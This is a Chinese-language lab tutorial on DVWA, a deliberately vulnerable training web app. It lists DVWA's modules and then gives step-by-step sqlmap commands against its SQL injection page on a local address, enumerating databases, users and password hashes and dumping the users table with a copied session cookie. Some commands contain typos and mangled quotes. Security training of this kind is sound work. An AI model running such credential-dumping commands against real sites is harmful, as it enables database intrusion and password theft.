# DVWA-Sqlmap

---

DVWA（Damn Vulnerable Web App）是一个基于PHP/MySql搭建的Web应用程序，旨在为安全专业人员测试自己的专业技能和工具提供合法的 环境，帮助Web开发者更好的理解Web应用安全防范的过程。

DVWA一共包含十个模块分别是：

1.Bruce Force //暴力破解

1.Command Injection //命令注入

1.CSRF //跨站请求伪造

1.File Inclusion //文件包含

1.File Upload //文件上传漏洞

1.Insecure CAPTCHA //不安全的验证

1.SQL Injection //sql注入

1.SQL Injection（Blind） //sql注入（盲注）

1.XSS（Reflected） //反射型XSS

1.XSS（Stored） //存储型XSS

同时每个模块的代码都有4种安全等级：Low、Medium、High、Impossible。通过从低难度到高难度的测试并参考代码变化可帮助学习者更快的理解漏洞的原理。

---
# sqlmap 

sqlmap 是一个开源渗透测试工具，它可以自动检测和利用 SQL 注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令。

在浏览器中输入自己的ip地址打开dvwa的主页面

选择默认安全等级

进入sql注入模块

随便提交一个数据发现网站提交数据的方式是GET,然后复制地址栏上的URL

按F12打开浏览器的开发人员工具,然后刷新页面找到刚刚那个请求,然后在请求的请求头中找到cookie,复制其中的值到记事本中

回到kali打开终端输入以下命令

root@kali:-# sqlmap -u “http://192.168.0.101/dvwa/vulnerabilities/sqli/?id= 1&Submit=Submit#” --cookie ”security=low; PHPSESSID=r9t toc0nte03r3ofacqfu6jev2" --batch --dbs

回车后可以看见该网页所有的数据库被爆了出来

查看当前数据库

root@kali:-# sqlmap -u “http://192.168.0.101/dvwa/vulnerabilities/sqli/?id= 1&Submit=Submit#” --cookie ”security=low; PHPSESSID=r9t toc0nte03r3ofacqfu6jev2" --batch --current-db

查看数据库中的用户

root@kali:-# sqlmap -u “http://192.168.0.101/dvwa/vulnerabilities/sqli/?id= 1&Submit=Submit#” --cookie ”security=low; PHPSESSID=r9t toc0nte03r3ofacqfu6jev2" --batch --users

查看用户名和密码

root@kali:-# sqlmap -u “http://192.168.0.101/dvwa/vulnerabilities/sqli/?id= 1&Submit=Submit#” --cookie ”security=low; PHPSESSID=r9t toc0nte03r3ofacqfu6jev2" --batch --users --passwords

查看某数据库中的所有表

root@kali:-# sqlmap -u “http://192.168.0.101/dvwa/vulnerabilities/sqli/?id= 1&Submit=Submit#” --cookie ”security=low; PHPSESSID=r9t toc0nte03r3ofacqfu6jev2" --batch --D dvwa --tables

查看某表中的数据

root@kali:-# sqlmap -u “http://192.168.0.101/dvwa/vulnerabilities/sqli/?id= 1&Submit=Submit#” --cookie ”security=low; PHPSESSID=r9t toc0nte03r3ofacqfu6jev2" --batch --D dvwa -T users --colums

保存到本地

root@kali:-# sqlmap -u “http://192.168.0.101/dvwa/vulnerabilities/sqli/?id= 1&Submit=Submit#” --cookie ”security=low; PHPSESSID=r9t toc0nte03r3ofacqfu6jev2" --batch --D dvwa -T users -C “user,password” --dump

查看刚刚保存的内容

root@kali:~# cat /root/.sqLmap/output/192.168.0.101/dump/dvwa/users.cvs
